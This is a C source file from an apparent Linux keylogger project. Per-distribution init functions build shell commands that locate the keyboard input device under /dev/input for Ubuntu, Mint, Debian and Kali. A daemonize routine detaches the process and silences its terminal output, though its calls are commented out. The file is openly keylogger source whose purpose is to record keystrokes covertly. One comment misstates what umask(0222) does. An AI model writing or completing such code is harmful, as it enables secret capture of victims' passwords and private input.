#include <stdlib.h>
#include <stdio.h>  // printf()
#include <unistd.h>  // geteuid()
#include <syslog.h>  // syslog()
#include <errno.h>
#include <string.h>  //strerror()
#include <sys/stat.h>  // umask()

#include "../../includes/keylogger/keylogger_utils.h"
#include "../../includes/keylogger/debian_keylogger_utils.h"

static void daemonize(void);

/*  Call daemonise fonction, check if user is in root, prepare the command line for find the keyboard device
 *  and launch the function for that.
 */

void ubuntu_keylogger_init()
{
    //daemonize();

    /* For Debian */
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /*Ubunutu */
    //const char *command = "find /dev/input/by-id -name '*Device*'";

    /* Kali and Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /* For Debian */
    //debian_get_kb_device_filename(command);

    /* For others distrib */
    get_kb_device_filename(command);

    return;
}

void mint_keylogger_init()
{
    //daemonize();

    /* Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    get_kb_device_filename(command);

    return;
}

void debian_keylogger_init()
{
    //daemonize();

    /* For Debian */
    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
    const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";

    /* For Debian */
    debian_get_kb_device_filename(command);

    return;
}

void kali_keylogger_init()
{
    //daemonize();

    /* Kali and Mint 19 */
    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";

    /* For others distrib */
    get_kb_device_filename(command);

    return;
}

/* daemonise the process */
static void daemonize(void)
{
    /* the PID after fork() */
    pid_t pid;

    /* Verification : does the actual process is a daemon ? if yes we quit */
    if(getppid() == 1)
        return;

    /* duplicate process with fork() */

    pid = fork();
    if(pid < 0)
    {
        syslog(LOG_ERR, "fork() failed : %d : %s", errno, strerror(errno));
        exit(EXIT_FAILURE);
    }

    /* we stop the father process */
    if(pid > 0)
        exit(EXIT_SUCCESS);

    /*  Give all the rights read/write to the daemon under the file he create */
    umask(0222);

    /*  Create a new session, in order the son do not receive the signal destine to the father */
    if(setsid() < 0)
    {
        syslog(LOG_ERR, "setsid failed : %d : %s", errno, strerror(errno));
        exit(EXIT_FAILURE);
    }

    /*  Redirect standard I/O for cancel all user terminal messages */
    if( freopen("/dev/null", "r", stdin) == NULL )
        error("freopen() stdin\nFonction : main()");

    if( freopen("/dev/null", "w", stdout) == NULL )
        error("freopen() stdout\nFonction : main()");

    if( freopen("/dev/null", "w", stderr) == NULL )
        error("freopen stderr\nFonction : main");

    return;
}
